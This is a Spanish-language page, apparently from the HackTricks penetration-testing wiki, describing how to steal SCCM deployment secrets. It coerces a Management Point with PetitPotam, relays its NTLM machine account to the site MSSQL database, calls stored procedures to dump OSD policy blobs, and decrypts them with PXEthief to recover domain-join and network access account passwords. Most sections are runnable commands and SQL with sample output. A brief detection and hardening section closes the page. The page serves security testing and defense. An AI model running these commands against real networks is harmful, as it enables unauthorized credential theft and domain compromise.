# Extracción de secretos de políticas OSD mediante NTLM Relay en el Punto de Gestión de SCCM

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Al forzar un **Punto de Gestión (MP) de System Center Configuration Manager (SCCM)** a autenticar a través de SMB/RPC y **retransmitir** esa cuenta de máquina NTLM a la **base de datos del sitio (MSSQL)**, obtienes derechos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Estos roles te permiten llamar a un conjunto de procedimientos almacenados que exponen blobs de políticas de **Despliegue del Sistema Operativo (OSD)** (credenciales de la Cuenta de Acceso a la Red, variables de Secuencia de Tareas, etc.). Los blobs están codificados/encriptados en hexadecimales, pero pueden ser decodificados y desencriptados con **PXEthief**, obteniendo secretos en texto plano.

Cadena de alto nivel:
1. Descubrir MP y base de datos del sitio ↦ punto final HTTP no autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Iniciar `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forzar MP usando **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. A través del proxy SOCKS, conectarse con `mssqlclient.py -windows-auth` como la cuenta retransmitida **<DOMAIN>\\<MP-host>$**.
5. Ejecutar:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (o `MP_GetPolicyBodyAfterAuthorization`)
6. Eliminar `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secretos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. se recuperan sin tocar PXE o clientes.

---

## 1. Enumerando puntos finales MP no autenticados
La extensión ISAPI del MP **GetAuth.dll** expone varios parámetros que no requieren autenticación (a menos que el sitio sea solo PKI):

| Parámetro | Propósito |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Devuelve la clave pública del certificado de firma del sitio + GUIDs de dispositivos **Todos los Computadores Desconocidos** *x86* / *x64*. |
| `MPLIST` | Lista cada Punto de Gestión en el sitio. |
| `SITESIGNCERT` | Devuelve el certificado de firma del Sitio Primario (identifica el servidor del sitio sin LDAP). |

Obtén los GUIDs que actuarán como el **clientID** para consultas posteriores a la base de datos:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Reenviar la cuenta de máquina MP a MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Cuando se activa la coerción, deberías ver algo como:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificar políticas OSD a través de procedimientos almacenados
Conéctese a través del proxy SOCKS (puerto 1080 por defecto):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Cambia a la base de datos **CM_<SiteCode>** (usa el código de sitio de 3 dígitos, por ejemplo, `CM_001`).

### 3.1  Encontrar GUIDs de Computadora Desconocida (opcional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Listar políticas asignadas
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Cada fila contiene `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Enfócate en las políticas:
* **NAAConfig**  – Credenciales de la cuenta de acceso a la red
* **TS_Sequence** – Variables de la secuencia de tareas (OSDJoinAccount/Password)
* **CollectionSettings** – Puede contener cuentas de ejecución

### 3.3  Recuperar cuerpo completo
Si ya tienes `PolicyID` y `PolicyVersion`, puedes omitir el requisito de clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: En SSMS aumenta "Máximo de caracteres recuperados" (>65535) o el blob será truncado.

---

## 4. Decodificar y descifrar el blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Ejemplo de secretos recuperados:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Roles y procedimientos SQL relevantes
Al realizar el relay, el inicio de sesión se asigna a:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Estos roles exponen docenas de permisos EXEC, los más importantes utilizados en este ataque son:

| Procedimiento Almacenado | Propósito |
|--------------------------|-----------|
| `MP_GetMachinePolicyAssignments` | Listar políticas aplicadas a un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Devolver el cuerpo completo de la política. |
| `MP_GetListOfMPsInSiteOSD` | Devuelto por la ruta `MPKEYINFORMATIONMEDIA`. |

Puedes inspeccionar la lista completa con:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Detección y Fortalecimiento
1. **Monitorear inicios de sesión de MP** – cualquier cuenta de computadora de MP que inicie sesión desde una IP que no sea su host ≈ relay.
2. Habilitar **Protección Extendida para Autenticación (EPA)** en la base de datos del sitio (`PREVENT-14`).
3. Deshabilitar NTLM no utilizado, hacer cumplir la firma SMB, restringir RPC (
mismas mitigaciones utilizadas contra `PetitPotam`/`PrinterBug`).
4. Fortalecer la comunicación MP ↔ DB con IPSec / mutual-TLS.

---

## Véase también
* Fundamentos del relay NTLM:
{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuso de MSSQL y post-explotación:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Referencias
- [Me gustaría hablar con su gerente: Robando secretos con relays de punto de gestión](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Gestor de Configuraciones Incorrectas – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
